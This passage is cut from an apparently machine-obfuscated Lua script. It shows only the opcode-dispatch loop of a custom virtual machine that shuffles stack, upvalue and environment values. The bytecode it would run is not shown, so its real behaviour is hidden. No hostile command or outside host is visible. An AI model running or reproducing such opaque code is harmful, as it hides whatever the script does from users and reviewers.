;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];elseif (Enum>27) then local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];else Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];end elseif (Enum<=33) then if (Enum<=30) then if (Enum==29) then if (Stk[Inst[2]]==Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];end elseif (Enum<=31) then local Edx;local Results,Limit;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];for Idx=Inst[2],Inst[3] do Stk[Idx]=nil;end VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];elseif (Enum>32) then local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=35) then if (Enum>34) then local Edx;local Results;local B;local A;A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local B;local T;local A;Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];T=Stk[A];B=Inst[3];for Idx=1,B do T[Idx]=Stk[A + Idx ];end end elseif (Enum<=36) then if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum==37) then local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local Edx;local Results,Limit;local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=57) then if (Enum<=47) then if (Enum<=42) then if (Enum<=40) then if (Enum==39) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3]^Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]]/Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local Results;local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];for Idx=Inst[2],Inst[3] do Stk[Idx]=nil;end VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Unpack(Stk,A + 1 ,Top))};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum>41) then Stk[Inst[2]]=Inst[3]^Stk[Inst[4]] ;else local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];do return;end end elseif (Enum<=44) then if (Enum==43) then Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]();end elseif (Enum<=45) then local A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));elseif (Enum==46) then Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];else Stk[Inst[2]]=Stk[Inst[3]] -Stk[Inst[4]] ;end elseif (Enum<=52) then if (Enum<=49) then if (Enum==48) then local Edx;local Results;local B;local A;A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=50) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];elseif (Enum>51) then local Step;local Index;local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Index=Stk[A];Step=Stk[A + 2 ];if (Step>0) then if (Index>Stk[A + 1 ]) then VIP=Inst[3];else Stk[A + 3 ]=Index;end elseif (Index<Stk[A + 1 ]) then VIP=Inst[3];else Stk[A + 3 ]=Index;end else do return;end end elseif (Enum<=54) then if (Enum>53) then Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local Results;local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 